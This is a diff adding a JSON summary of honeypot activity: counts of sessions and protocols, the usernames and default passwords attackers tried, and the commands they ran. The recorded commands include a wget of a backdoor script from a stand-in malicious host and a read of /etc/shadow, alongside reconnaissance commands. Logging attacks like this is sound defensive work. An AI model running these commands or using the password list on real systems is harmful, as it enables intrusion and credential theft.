@@ -1,0 +1,116 @@
+{
+  "sessions": 48,
+  "credentials": 24,
+  "commands": 21,
+  "http_requests": 25,
+  "alerts": 8,
+  "unique_ips": 1,
+  "top_users": [
+    {
+      "username": "root",
+      "c": 18
+    },
+    {
+      "username": "admin",
+      "c": 4
+    },
+    {
+      "username": "administrator",
+      "c": 1
+    },
+    {
+      "username": "anonymous",
+      "c": 1
+    }
+  ],
+  "top_pass": [
+    {
+      "password": "hunter2",
+      "c": 14
+    },
+    {
+      "password": "toor",
+      "c": 2
+    },
+    {
+      "password": "admin",
+      "c": 2
+    },
+    {
+      "password": "password",
+      "c": 1
+    },
+    {
+      "password": "kali@kali",
+      "c": 1
+    },
+    {
+      "password": "admin123",
+      "c": 1
+    },
+    {
+      "password": "P@ssw0rd",
+      "c": 1
+    },
+    {
+      "password": "123456",
+      "c": 1
+    }
+  ],
+  "top_cmds": [
+    {
+      "command": "POST /admin username=admin",
+      "c": 2
+    },
+    {
+      "command": "whoami",
+      "c": 1
+    },
+    {
+      "command": "wget http://malicious.example/backdoor.sh",
+      "c": 1
+    },
+    {
+      "command": "uname -a",
+      "c": 1
+    },
+    {
+      "command": "ps aux | head -8",
+      "c": 1
+    },
+    {
+      "command": "netstat -tlnp | head -6",
+      "c": 1
+    },
+    {
+      "command": "ls -la /root",
+      "c": 1
+    },
+    {
+      "command": "id",
+      "c": 1
+    },
+    {
+      "command": "hostname",
+      "c": 1
+    },
+    {
+      "command": "cat /etc/shadow",
+      "c": 1
+    }
+  ],
+  "protos": [
+    {
+      "protocol": "ftp",
+      "c": 2
+    },
+    {
+      "protocol": "http",
+      "c": 25
+    },
+    {
+      "protocol": "ssh",
+      "c": 21
+    }
+  ]
+}
